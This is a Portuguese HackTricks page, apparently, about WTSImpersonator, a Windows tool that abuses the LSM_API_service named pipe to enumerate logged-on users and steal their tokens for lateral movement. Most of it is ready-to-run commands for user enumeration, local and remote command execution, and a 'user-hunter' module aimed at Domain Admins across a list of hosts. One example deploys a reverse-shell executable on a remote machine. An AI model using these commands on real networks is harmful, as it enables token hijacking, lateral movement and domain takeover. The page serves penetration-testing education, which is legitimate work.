<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

O **WTS Impersonator** explora a ferramenta **"\\pipe\LSM_API_service"** RPC Named pipe para enumerar furtivamente usuários logados e sequestrar seus tokens, contornando técnicas tradicionais de Impersonation de Token. Essa abordagem facilita movimentos laterais contínuos dentro das redes. A inovação por trás dessa técnica é creditada a **Omri Baso, cujo trabalho está acessível no [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Funcionalidade Principal
A ferramenta opera por meio de uma sequência de chamadas de API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Módulos Chave e Uso
- **Enumerando Usuários**: A enumeração de usuários local e remota é possível com a ferramenta, usando comandos para cada cenário:
- Localmente:
```powershell
.\WTSImpersonator.exe -m enum
```
- Remotamente, especificando um endereço IP ou nome do host:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executando Comandos**: Os módulos `exec` e `exec-remote` requerem um contexto de **Serviço** para funcionar. A execução local simplesmente precisa do executável WTSImpersonator e de um comando:
- Exemplo de execução de comando local:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe pode ser usado para obter um contexto de serviço:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Execução de Comando Remoto**: Envolve a criação e instalação de um serviço remotamente semelhante ao PsExec.exe, permitindo a execução com permissões apropriadas.
- Exemplo de execução remota:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Módulo de Caça ao Usuário**: Alveja usuários específicos em várias máquinas, executando código sob suas credenciais. Isso é especialmente útil para visar Administradores de Domínio com direitos de administrador local em vários sistemas.
- Exemplo de uso:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
